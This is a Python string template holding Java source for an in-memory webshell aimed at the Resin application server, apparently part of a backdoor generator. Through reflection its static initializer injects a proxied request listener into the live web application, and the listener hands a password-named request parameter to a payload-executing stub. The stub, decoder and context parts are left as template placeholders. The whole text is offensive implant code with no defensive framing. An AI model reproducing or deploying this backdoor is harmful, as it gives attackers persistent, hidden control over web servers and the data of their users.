code = """
import java.lang.reflect.*;
import java.util.ArrayList;

public class ResinListener extends ClassLoader implements InvocationHandler {{
    private static String password = "{password}";
{common}
{decoder}
{stub}
{context}
    private void hook(Object servletRequestEvent) throws Exception {{
        Object servletRequest = invokeMethod(
            servletRequestEvent, "getServletRequest"
        );
        Object servletResponse = invokeMethod(servletRequest, "getResponse");
        String payload = (String) invokeMethod(
            servletRequest, "getParameter", password
        );
        stub(payload, servletRequest, servletResponse);
    }}

    @Override
    public Object invoke(Object proxy, Method method, Object[] args)
            throws Throwable {{
        if (method.getName().equals("requestInitialized")) {{
            Object servletRequestEvent = args[0];
            hook(servletRequestEvent);
        }}
        return null;
    }}

    private void addListener(Object proxyObject) throws Exception {{
        Object webApp = getWebApp();
        Method addListenerObject = getMethodX(
            webApp.getClass(), "addListenerObject", 2
        );
        addListenerObject.setAccessible(true);
        addListenerObject.invoke(webApp, proxyObject, true);
    }}

    public ResinListener() {{
        synchronized(lock) {{
            if (System.getProperty("initialized") != null) {{
                return;
            }}

            Class servletRequestListener = null;
            try {{
                servletRequestListener = Class.forName(
                    "javax.servlet.ServletRequestListener"
                );
            }} catch (ClassNotFoundException e) {{}}

            if (servletRequestListener != null) {{
                Object proxyObject = Proxy.newProxyInstance(
                    getLoader(), new Class[]{{servletRequestListener}}, this
                );
                try {{
                    addListener(proxyObject);
                }} catch (Exception e) {{}}
            }}

            System.setProperty("initialized", "true");
        }}
    }}

    public ResinListener(ClassLoader loader) {{
        super(loader);
    }}

    static {{
        new ResinListener();
    }}
}}
"""